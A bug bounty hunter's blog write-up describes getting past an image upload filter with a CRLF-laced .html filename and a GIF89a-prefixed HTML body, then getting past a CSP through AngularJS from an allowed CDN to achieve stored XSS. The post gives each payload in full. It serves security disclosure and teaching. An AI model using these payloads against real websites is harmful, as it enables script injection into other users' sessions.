# Image Upload Bypass Leading to Stored XSS

> **Author**: Cyx
> **Published**: Dec 22, 2025

---

Featured

![Cyx](https://miro.medium.com/v2/resize:fill:32:32/1*knO5efIGpTM5PF9F_UWFPA.jpeg)

97

4

Listen

Share

My name is Ignacio Jose Riva, and I am a full-time Bug Bounty Hunter actively working in platforms like Bugcrowd, Intigriti, Hackerone, etc hunting for all kinds of vulnerabilities.

## cyx on Bugcrowd

### Bugcrowd’s bug bounty and vulnerability disclosure platform connects the global security researcher community with your…

bugcrowd.com

In this article, I will explain how I was able to bypass an image upload functionality and achieve a Stored XSS on a target website.

![image](https://miro.medium.com/v2/resize:fit:700/1*-Yn7QVKlei0v3kPxiSGzCA.png)

## 🖊️Writeup

While testing https://app.target.com/, I found an interesting endpoint under the /profile path.

![image](https://miro.medium.com/v2/resize:fit:573/1*sl1HbjNV8Fq7ekoaynvTvA.png)

The profile image upload functionality relies on the following POST endpoint:

```
POST /api/images/
```

After uploading an image, the file becomes accessible at:

```
/files/images/<filename>.png
```

Response:

```
{
  "message": "Upload successfully",
  "files": [
    {
      "name": "<img>",
      "path": "images/<img>",
      "url": "https://app.target.com/files/images/<img>"
    }
  ]
}
```

At first glance, the upload validation was protected by a strict regex, making it impossible to escalate this issue to Remote Code Execution (RCE).

Therefore, the most viable attack vector was attempting a Stored XSS.

I focused on abusing filename handling by using an .html extension combined with null bytes (%0d%0a).

## Get Cyx’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

The payload used was:

```
filename="name.html%0d%0a.png"
Content-Type: text/html
```

To bypass the image validation, the request body started with a GIF89a file signature, followed by HTML content:

```
GIF89a
<html>
<body>
                ANY
</body>
</html>
```

This allowed the file to be uploaded and rendered as an HTML page instead of an image.

## CSP Restriction

When attempting to execute JavaScript, the payload was blocked by the Content Security Policy (CSP):

![image](https://miro.medium.com/v2/resize:fit:501/1*axLeYg_2D-fT9zMqu5IDxQ.png)

```
script-src 'self' https://cdn.jsdelivr.net
```

This meant that only scripts hosted on the same domain or loaded from cdn.jsdelivr.net were allowed.

To bypass this restriction, I used AngularJS loaded from cdn.jsdelivr.net, which is allowed by the CSP.
A very useful resource for CSP-based attacks is:

https://cspbypass.com/

## Final Payload (Stored XSS)

```
<script src="https://cdn.jsdelivr.net/npm/angular@1.8.3/angular.min.js"></script>
<div ng-app>
<img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert('XSS by cyx :)');">
```

After uploading the file, I accessed it directly at: https://app.target.com/files/images/name.html

![image](https://miro.medium.com/v2/resize:fit:700/1*ETJKt4e7zeef9CEAzC2hnA.png)

At this point, I successfully:

- Bypassed the image upload restriction
- Bypassed the CSP
- Achieved a Stored XSS

## ✉️ Get in Touch

For questions, collaborations, or to learn more about bug bounty hunting, connect with me on:

- LinkedIn: https://linkedin.com/in/cyxbugs/
- Twitter: https://x.com/cyxbugs



---
*Original URL: [https://medium.com/@cyxbugs/image-upload-bypass-leading-to-stored-xss-546fd6db58b5?source=search_post---------95-----------------------------------](https://medium.com/@cyxbugs/image-upload-bypass-leading-to-stored-xss-546fd6db58b5?source=search_post---------95-----------------------------------)*
